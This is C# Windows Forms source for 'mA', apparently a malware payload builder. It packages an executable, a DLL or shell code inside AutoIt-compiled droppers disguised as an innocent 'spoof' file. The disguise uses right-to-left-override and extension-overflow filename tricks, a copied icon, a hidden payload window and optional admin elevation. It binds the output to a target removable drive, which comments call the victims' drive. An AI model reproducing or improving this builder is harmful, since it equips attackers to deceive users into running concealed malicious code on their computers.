#define isdbg //NOTE: DO NOT FORGET TO UNDEFINE THIS ON RELEASE.

using System;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;
using System.IO;
using System.Drawing.IconLib;
using System.Net;
using System.Diagnostics;
//using System.Runtime.InteropServices;

namespace masamangalternatibo {

    public partial class Form1 : Form {
        public Form1() { InitializeComponent(); }

        int payloadMode = 0; // 0 = File payload // 1 = Shell Code payload // 2 = Load DLL to rundll32
        string[] payloadData = new string[6]; //Stores the data from the textbox so the user can switch modes without losing the last settings Index 0-2: Stores the mode data // Index 3-4: Stores the arguments // Index 5: argument placeholder for shell mode (opposed for efficiency rather than doing heavy math and comparisons)
        string[] payloadFile = new string[2]; // Stores the data of ofdPayload.FileName incase the user switches modes // 0 = File Payload // 1 = DLL Payload
        public bool[] excomp = { false, false, false}; // Acts as a switch if the external components exist or not // 0 = Icon Library // 1 = UPX // 2 = Get Drive Serial
        public bool isicon = false; //Keeps track if there's a selected / designated icon
        public int overflowCount = 20;
        string apth = Application.StartupPath;
        globalClass _gc = new globalClass();

        private void Form1_Close(object sender, FormClosingEventArgs e) {
            cleanup();
        }

        private void Form1_Load(object sender, EventArgs e) {
            dbgmsg("Starting from: " + apth);
            lblVersion.Text = "v" + globalClass.version;
            checkComponent(
                "Compiler",
                "compiler.exe",
                "1.32mb",
                "",
                "The AutoIt compiler (compiler.exe) was not found, you cannot use mA with out the compiler as it needs to compile scripts to a standalone executables.",
                true
            );

            excomp[0] = checkComponent(
                "Icon Library",
                "IconLib.dll",
                "56.5kb",
                "",
                "The IconLib (IconLib.dll) Library was not found, some functions that are used by this application relies on this library file such as handling Icon conversion."
            );

            excomp[1] = checkComponent(
                "Executable Compressor",
                "upx.exe",
                "356kb",
                "",
                "The UPX Compressor (upx.exe) was not found, This component is used to compress executable files to lessen their file size and is also utilized by the script compiler."
            );

            checkComponent(
                "Payload Template",
                "payloadTemplate.txt",
                "???",
                "",
                "The Payload Template is a text file that contains the payload script structure that is read by the program and is parsed to create your payload.",
                true
            );

            excomp[2] = checkComponent(
                "Get Drive Serial",
                "getDriveSerial.exe",
                "372kb",
                "",
                "This component is used to obtain a drive's serial number for creating carrier binded payloads."
            );

            loadDrives();

            #if !(isdbg)
                dbgmsg("Setting up...");
                tbPayload.ReadOnly = true;
                tbSpoof.ReadOnly = true;
            #endif

            if (excomp[2] == false) chkSerial.Enabled = false;

            dbgmsg("WARNING: Console Commands aren't filtered/check; They're executed directly and immidiately. Be cautious on executing commands.");
            dbgmsg("mA Ready! // Hover an item for more information!");
            #if isdbg
            dbgmsg("mA is running in debugging mode");
            #endif
            dbgmsg("NOTICE: This version of mA is currently in a test phase release, please be aware of instability.");
        }

        #region [Console Commands]
        private void btnConsole_Click(object sender, EventArgs e) {
            string[] con = tbConsole.Text.Split(' ');
            switch ((con[0]).ToLower()) {

                case "setdrive":
                    drpDrives.Items.Add(con[1]);
                    drpDrives.SelectedIndex = drpDrives.Items.Count - 1;
                    dbgmsg("Override command -- Drive selection set and added -- " + con[1]);
                    break;

                case "exit":
                    Application.Exit();
                    break;

                case "setoverflowcount":
                    overflowCount = Convert.ToInt32(con[1]);
                    dbgmsg("Overflow loop count changed to " + con[1]);
                    break;

                case "setimagelocation":
                    imgFileIcon.ImageLocation = con[1];
                    dbgmsg("Image location set : " + con[1]);
                    break;

                case "cls":
                    dbgRtb.Text = "";
                    break;

                case "overflowdebugmsg":
                    dbgmsg("The quick brown fox jumps over the lazy dog The quick brown fox jumps over the lazy dog The quick brown fox jumps over the lazy dog The quick brown fox jumps over the lazy dog");
                    break;

                case "showpayloadfile":
                    dbgmsg("payloadFile[0]=" + payloadFile[0]);
                    dbgmsg("payloadFile[1]=" + payloadFile[1]);
                    break;

                case "checkcomp": //Check the function documentation of "checkComponent" to know the debug arguments/parameters
                    dbgmsg("Testing checkComponent() Function");
                    dbgmsg("Test returned a value of: " + checkComponent(con[1], con[2], con[3], con[4], con[5]).ToString());
                    break;

                case "teststrformat":
                    dbgmsg("strformat:" + String.Format(con[1], con[2]));
                    break;

                case "formsetwidth":
                    dbgmsg("Form width set to: " + con[1]);
                    this.Width = Convert.ToInt32(con[1]);
                    break;

                case "cleanup":
                    cleanup();
                    break;

                case "showallui":
                    dbgmsg("showing all ui...");
                    about _a = new about();
                    buildPayload _b = new buildPayload();
                    minipad _c = new minipad();
                    _a.Show();
                    _b.Show();
                    _c.Show();
                    break;

                case "rtlo":
                    dbgmsg(globalClass.rtlo + con[1]);
                    break;

                case "getserial":
                    dbgmsg("driveserial: " + getSerial(con[1]));
                    break;

                default:
                    dbgmsg("Bad command! Available commands:\nsetdrive [driveletter]\nsetoverflowcount [integer]\nsetimagelocation [filepath]\nshowpayloadfile\noverflowdebugmsg\ncheckcomp [name] [filename] [size] [link] [desc]\nteststrformat [string] [data]\nformsetwidth [integer]\ncleanup\nshowallui\nrtlo [string]\ngetserial [drive]\ncls\nexit\n");
                    break;
            }
            tbConsole.Text = "";
        }
        #endregion

        /*
         Check Component Function - Checks the external components of mA.
         ------------------------------------------------------------------------------------------------- 
         checkComponent(
                Component Name,
                File Name,
                File Size,
                Download Link,
                Component Description,
                Importance (Optional) | Value: false = Optional Component, true = Important Component
         )
         -------------------------------------------------------------------------------------------------
         *returns: true = The component exists / has been downloaded, false = The component doesn't exist
        */
        public bool checkComponent(string name, string flname, string flsize, string dllink, string desc, bool importance = false) {
            bool rbool = false;
            if (File.Exists(flname) != true) {
                if (MessageBox.Show("An " + (importance ? "important" : "optional") + " component is missing!\n\n" + desc + "\n\nDownload File: \"" + flname + "\" (" + flsize + ")?\nDownload Link: " + dllink + "\n\nThis will be done in the background.", "Component Missing: " + name + " | \"" + flname + "\" (" + flsize + ")!", MessageBoxButtons.YesNo) == DialogResult.Yes) {
                    if (dllink == "") {
                        MessageBox.Show("A download of this component is not available, please consider re-acquiring and/or re-unpack(ing) the application with a complete set of required files.", "Component Download Unavailable", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        rbool = false;
                        if (importance) {
                            Application.Exit();
                        }
                    }
                    else {
                        try {
                            using (WebClient _wc = new WebClient()) {
                                _wc.DownloadFile(dllink, flname);
                            }
                            MessageBox.Show("Download Complete!");
                            rbool = true;
                        }
                        catch {
                            rbool = false;
                            MessageBox.Show("Component download failed!", "Download Fail!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            if (importance) {
                                Application.Exit();
                            }
                        }
                    }
                }
                else {
                    rbool = false;
                    if (importance) {
                        Application.Exit();
                    }
                }
            }
            else {
                rbool = true;
            }
            dbgmsg("ComCheck:" + flname + ":" + rbool);
            return rbool;
        }

        /*
         Extract Icon Function - used to extract icons by utilizing the IconLib Library.
         ----------------------------------------------------------------------------------
         extractIcon(
                From button Boolean Value,
                File to extract the Icon from
         )
         ----------------------------------------------------------------------------------
         *fromButton suppresses error if it wasn't the users' intention to extract an icon
         *returns: nothing
        */
        private void extractIcon(bool fromButton = false, string iconfile = "") {
            if (excomp[0] && iconfile != "") {
                dbgmsg("Extracting associated icon to bitmap...");
                (Icon.ExtractAssociatedIcon(iconfile).ToBitmap()).Save(apth + "\\$_bmptmp.bmp");
                MultiIcon conico = new MultiIcon();
                conico.Add("iconinstance").CreateFrom(apth + "\\$_bmptmp.bmp", IconOutputFormat.Vista);
                conico.SelectedIndex = 0;
                conico.Save(apth + "\\$tmp.ico", MultiIconFormat.ICO);
                imgFileIcon.ImageLocation = "$tmp.ico";
                File.Delete(apth + "\\$_bmptmp.bmp");
                dbgmsg("Temporary bitmap file deleted.");
                isicon = true;
            }
            else {
                if (fromButton) {
                    MessageBox.Show("No spoof file imported or Icon Library functions can't be utilized", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
                else {
                    dbgmsg("Error from un-intended extraction suppressed!");
                }
            }
        }

        /*
         Trim Extension Function - Separates the file name to its extension
         -------------------------------------------------------------------
         trimexit(
                File name (string)
         )
         -------------------------------------------------------------------
         *returns: string
         *         Index 0: File Name
         *         Index 1: File Extension
        */
        public string[] trimext(string flname) {
            string[] aa = flname.Split('.');
            string[] tmp = new string[2];
            tmp[0] = aa[0];
            for (int x = 1; x < aa.Count() - 2; x++) {
                tmp[0] += "." + aa[x];
            }
            tmp[1] = aa[aa.Count() - 1];
            return tmp;
        }

        //Ghetto Title bar management
        #region Title Bar
        private void titlebar_MouseMove(object sender, MouseEventArgs e) {
            if (e.Button == MouseButtons.Left) {
                this.Location = new Point((MousePosition.X - (titlebar.Size.Width / 2)), (MousePosition.Y - (titlebar.Size.Height / 2)));
            }
        }
        private void label4_MouseMove(object sender, MouseEventArgs e) { titlebar_MouseMove(null, e); }
        private void label1_MouseMove(object sender, MouseEventArgs e) { titlebar_MouseMove(null, e); }

        private void btnClose_Click(object sender, EventArgs e) {
            Application.Exit();
        }
        #endregion

        /*
         Debug Message Function - Function to be utilized to output messages in the debug console prepend form.
         --------------------------------------------------------------------------------------------------------
         dbgmsg(
                Debug Message
         )
         --------------------------------------------------------------------------------------------------------
         *returns: nothing
        */
        private void dbgmsg(string a) {
            dbgRtb.Text = "•" + a + "\n" + dbgRtb.Text;
        }

        /*
         Open Miniature Notepad Function - a function to open the MiniPad Window
         --------------------------------------------------------------------------
         openminipad(
                string to pass to mprtb (string),
                Enable Pass to shell button (bool),
                Enable Build button (bool)
         )
         --------------------------------------------------------------------------
         *Two or more instances uses the same code with small change of detail.
         *returns: nothing
        */
        private void openminipad(string writetb = "", bool enaBuild = false) {
            using (minipad _minipad = new minipad()) {
                _minipad._tmp = trimext(tbSpoof.Text);
                _minipad.btnCompileScript.Enabled = false;
                if (enaBuild) { _minipad.btnCompileScript.Enabled = true;}
                _minipad.mprtb.Text = writetb;
                _minipad.ShowDialog();
            }
        }

        /*
        Validate Input Function - a function that validates the user input and checks if anything is missing or mistaken before generating the script.
        -----------------------------------------------------------------------------------------------------------------------------------------------
         validateInput(
                Is in write mode (bool)
         )
        -----------------------------------------------------------------------------------------------------------------------------------------------
        *returns: nothing
       */
        private void validateInput(bool isWriteMode) {
            dbgmsg("Validating input...");
            if (tbPayload.Text == "") {
                MessageBox.Show("Payload is empty!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            if (tbSpoof.Text == "") {
                MessageBox.Show("Spoof is empty!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (payloadMode == 1) {
                if (tbArguments.Text == "") {
                    MessageBox.Show("DLL payload arguments is empty!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }
            }

            if (drpDrives.Items.Count < 1) {
                MessageBox.Show("No drives detected!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (Directory.Exists(drpDrives.SelectedItem.ToString()) == false) { 
                MessageBox.Show("Target drive doesn't exist!\n\nDrive: " + drpDrives.SelectedItem.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            startBuild(isWriteMode);
        }

        /*
        Start Build Function - a function that generates the payload script with the corresponding options provided by the user.
        ---------------------------------------------------------------------------------------------------------------------------------------
         stratBuild(
                Is in write mode (bool)
         )
        ---------------------------------------------------------------------------------------------------------------------------------------
        *returns: nothing
        */
        private void startBuild(bool isWriteMode) {

            /*
             * scriptData Array String Variable - Stores the temporary data to be written in the script through String.Format
             * ---------------------------------------------------------------------------------------------------------------
             * Index Representation Values
             *   0  - #RequireAdmin pre-processor
             *   1  - Payload arguments placeholder (string)
             *   2  - Execute through console (bool)
             *   3  - Stream console output to a text file (bool)
             *   4  - Execute in victims' drive (bool)
             *   5  - Payload name (string)
             *   6  - Spoofed File name (string)
             *   7  - Hide/Show Payload Window (Macro | @SW_SHOW / @SW_HIDE)
             *   8  - Console command execution switch (String | /k or /c)
             *   9  - Type of payload (integer | 0 = payload / 2 = dll payload / 3 = shell code)
             *   10 - Driver Serial Check (bool)
             *   11 - Driver Serial to Check (String)
            */
            string[] scriptData = new string[12];

            dbgmsg("Starting build...");
            dbgmsg("Importing template...");

            string templateData = File.ReadAllText("payloadTemplate.txt");

            if (payloadMode != 2) {
                dbgmsg("Importing payload...");
                if (File.Exists("$payloadtmp")) File.Delete("$payloadtmp");
                File.Copy(payloadFile[payloadMode], "$payloadtmp");
            }

            dbgmsg("Importing spoofed file...");
            if (File.Exists("$spooftmp")) File.Delete("$spooftmp");
            File.Copy(ofdSpoof.FileName, "$spooftmp");

            dbgmsg("Writing sections...");
            scriptData[0] = (chkAdminFlag.Checked ? "#RequireAdmin": null);
            scriptData[1] = ((payloadMode != 2) ? (chkArguments.Checked ? tbArguments.Text : null) : tbPayload.Text);
            scriptData[2] = ((payloadMode == 0 && chkConsole.Checked) ? "true" : "false");
            scriptData[3] = ((payloadMode == 0 && chkConsole.Checked && chkStreamConsole.Checked) ? "true" : "false");
            scriptData[4] = ((payloadMode == 0 && chkTarExe.Checked) ? "true" : "false");
            scriptData[5] = ((payloadMode != 2) ? tbPayload.Text : null);
            scriptData[6] = tbSpoof.Text;
            scriptData[7] = (chkHidWin.Checked ? "@SW_HIDE":"@SW_SHOW");
            scriptData[8] = ((payloadMode == 0 && chkConsole.Checked) ? btnCommand.Text : "");
            scriptData[9] = payloadMode.ToString();
            scriptData[10] = (chkSerial.Checked && excomp[2] ? "true" : "false");
            scriptData[11] = (chkSerial.Checked && excomp[2] ? getSerial(drpDrives.GetItemText(drpDrives.SelectedItem)) : "0000000000");

            dbgmsg("Writing parsed script to memory...");
            templateData = String.Format(templateData, scriptData[0], scriptData[1], scriptData[2], scriptData[3], scriptData[4], scriptData[5], scriptData[6], scriptData[7], scriptData[8], scriptData[9], scriptData[10], scriptData[11]);

            if (payloadMode == 2) {
                dbgmsg("Creating Payload placeholder...");
                if (File.Exists("$payloadtmp")) File.Delete("$payloadtmp");
                File.Create("$payloadtmp").Close();
            }

            if (isWriteMode) {
                openminipad(templateData, true);
            }
            else {
                using (buildPayload _bp = new buildPayload()) {
                    if (radOverflow.Checked) _bp.overflowCount = overflowCount;

                    if (radNone.Checked) {
                        _bp.spoofMode = 0;
                    }
                    else if (radOverflow.Checked) {
                        _bp.spoofMode = 1;
                    }
                    else if (radRTLO.Checked) {
                        _bp.spoofMode = 2;
                    }
                    string[] _tmp = trimext(tbSpoof.Text);
                    _bp.tbFlNm.Text = _tmp[0];
                    _bp.tbFkExt.Text = _tmp[1];
                    _bp.script = templateData;
                    _bp.drive = drpDrives.GetItemText(drpDrives.SelectedItem);
                    _bp.isicon = isicon;
                    _bp.ShowDialog();
                }
            }
        }

        /*
         * Clean up function - A function to be called to remove temporary files
         * ----------------------------------------------------------------------
         * Deletes all the files that starts with a dollar sign ($)
        */
        private void cleanup() {
            dbgmsg("Cleaning up temporary files...");
            foreach (string i in Directory.GetFiles(apth)) {
                string b = i.Replace(apth + "\\", "");
                char x = b[0];
                if (x == '$') {
                    dbgmsg("Deleting: " + b);
                    File.Delete(i);
                }
            }
            dbgmsg("Finished!");
        }

        /*
         Load Drives Function - Detects all the present drives in this computer by scanning directories.
         --------------------------------------------------------------------------------------------------
         *returns: nothing
        */
        private void loadDrives() {
            dbgmsg("Scanning for drives...");
            drpDrives.Items.Clear();
            DriveInfo[] _di = DriveInfo.GetDrives();
            foreach (DriveInfo drivenm in _di) {
                if (drivenm.IsReady && drivenm.Name != @"C:\") {
                    drpDrives.Items.Add(drivenm.Name);
                }
            }
            /* LEGACY *
            for (int i = 65; i <= 90; i++) {
                if (Directory.Exists(((char)i) + ":\\") && i != 67 ) {
                        drpDrives.Items.Add(((char)i) + ":\\");
                }
            }
            */
            if (drpDrives.Items.Count != 0) { drpDrives.SelectedIndex = 0; }
        }

        /*
         * Get Drive Serial Function - a function that utilizes the "getDriveSerial.exe" component to obtain the drive's serial number
         * ----------------------------------------------------------------------------------------------------------------------------
         *  getSerial (
         *          Drive Path (string)
         *  )
         * ----------------------------------------------------------------------------------------------------------------------------
         * returns: string - The serial number of the drive
         *          "error" - Component returned an error
        */
        private string getSerial(string gsdrive) {
            string gscout = "";
            dbgmsg("Utilizing getDriveSerial Component...");
            ProcessStartInfo _gspsi = new ProcessStartInfo("getDriveSerial.exe", gsdrive);
            _gspsi.RedirectStandardOutput = true;
            _gspsi.UseShellExecute = false;
            Process _phndl = Process.Start(_gspsi);
            using (StreamReader _psr = _phndl.StandardOutput) gscout = _psr.ReadLine();
            _phndl.WaitForExit();
            return gscout;
        }
        
        //Button Switch Mode - Allows the user to switch between payload modes
        private void btnSwitchMode_Click(object sender, EventArgs e) {
            payloadData[payloadMode] = tbPayload.Text; //Save the current payloadData to be displayed later

            payloadMode++;
            if (payloadMode == 3) { payloadMode = 0; }
            payloadData[payloadMode + 2] = tbArguments.Text;

            switch (payloadMode) {
                case 0: //Payload File Mode
                    ofdPayload.FileName = payloadFile[payloadMode];
                    btnSwitchMode.Text = "F";
                    btnBrowsePayload.Enabled = true;
                    tbPayload.ReadOnly = true;
                    lblPayload.Text = "Payload File:";
                    pnlFileOptGroup.Enabled = true;
                    ofdPayload.Filter = "All Files (*.*)|*.*";
                    tbArguments.Text = payloadData[3];
                    break;

                case 1: //Inject Library Mode
                    ofdPayload.FileName = payloadFile[payloadMode];
                    btnSwitchMode.Text = "D";
                    btnBrowsePayload.Enabled = true;
                    tbPayload.ReadOnly = true;
                    lblPayload.Text = "DLL File:";
                    pnlFileOptGroup.Enabled = false;
                    ofdPayload.Filter = "DLL Files (*.dll)|*.dll";
                    chkArguments.Checked = true;
                    tbArguments.Text = payloadData[4];
                    if (tbArguments.Text == "") { tbArguments.Text = "<entrypoint> <optional arguments>"; }
                    break;

                case 2: //Shell Code Mode
                    btnSwitchMode.Text = "S";
                    btnBrowsePayload.Enabled = false;
                    tbPayload.ReadOnly = false;
                    lblPayload.Text = "Shell Code:";
                    pnlFileOptGroup.Enabled = false;
                    chkArguments.Checked = false;
                    tbArguments.Text = "";
                    break;
            }
            tbPayload.Text = payloadData[payloadMode]; //Display the data of the currently selected payloadMode
        }

        private void btnUpdPay_Click(object sender, EventArgs e) {
            
        }

        private void btnUpdma_Click(object sender, EventArgs e) {

        }

        private void btnRefreshDrives_Click(object sender, EventArgs e) {
            loadDrives();
        }

        private void btnCommand_Click(object sender, EventArgs e) {
            if (btnCommand.Text == "/c") {
                btnCommand.Text = "/k";
            }
            else {
                btnCommand.Text = "/c";
            }
        }

        private void btnBrowseSpoof_Click(object sender, EventArgs e) {
            ofdSpoof.ShowDialog();
        }

        private void btnBrowsePayload_Click(object sender, EventArgs e) {
            ofdPayload.ShowDialog();
        }

        private void ofdPayload_FileOk(object sender, CancelEventArgs e) {
            tbPayload.Text = ofdPayload.SafeFileName;
            payloadFile[payloadMode] = ofdPayload.FileName;
            dbgmsg("Payload File Selected:" + ofdPayload.FileName);
        }

        private void ofdSpoof_FileOk(object sender, CancelEventArgs e) {
            tbSpoof.Text = ofdSpoof.SafeFileName;
            extractIcon(false, ofdSpoof.FileName);
            dbgmsg("Selected Spoof File:" + ofdSpoof.FileName);
        }

        private void btn3rdParty_Click(object sender, EventArgs e) {
            using (about _form = new about()) {
                _form.ShowDialog();
            }
        }

        private void chkArguments_CheckedChanged(object sender, EventArgs e) {
            if (chkArguments.Checked) {
                tbArguments.Enabled = true;
            }
            else {
                tbArguments.Enabled = false;
            }
        }

        private void chkConsole_CheckedChanged(object sender, EventArgs e) {
            if (chkConsole.Checked) {
                chkStreamConsole.Enabled = true;
                btnCommand.Enabled = true;
            }
            else {
                chkStreamConsole.Checked = false;
                chkStreamConsole.Enabled = false;
                btnCommand.Enabled = false;
            }
        }

        private void btnClearImage_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) {
            dbgmsg("Clearing image box...");
            imgFileIcon.Image = null;
            isicon = false;
        }

        private void btnBrowseImage_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) {
            ofdIcon.ShowDialog();
        }

        private void ofdIcon_FileOk(object sender, CancelEventArgs e) {
            dbgmsg("Copying as temporary file...");
            if (File.Exists("$tmp.ico")) { File.Delete("$tmp.ico"); }
            File.Copy(ofdIcon.FileName, "$tmp.ico");
            dbgmsg("Loading image...");
            imgFileIcon.ImageLocation = "$tmp.ico";
            dbgmsg("Imported:" + ofdIcon.FileName);
            isicon = true;
        }

        private void btnExtract_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) {
            extractIcon(true, ofdSpoof.FileName);
        }

        private void btnMiniPad_Click(object sender, EventArgs e) {
            if (payloadMode == 2) {
                openminipad(tbPayload.Text, false);
            }
            else {
                openminipad("", false);
            }
            
        }

        private void btnWrite_Click(object sender, EventArgs e) {
            validateInput(true);
        }

        private void btnBuild_Click(object sender, EventArgs e) {
            validateInput(false);
        }
    }
}
